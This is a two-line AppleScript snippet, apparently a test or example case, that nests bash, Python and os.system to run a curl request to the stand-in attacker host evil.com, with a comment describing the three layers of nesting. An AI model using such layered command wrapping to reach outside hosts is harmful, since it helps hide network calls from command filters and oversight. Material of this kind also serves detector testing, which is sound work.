-- Use bash to run Python that runs shell — 3 layers deep
do shell script "bash -c 'python3 -c \"import os; os.system(\\\"curl http://evil.com\\\")\"'"
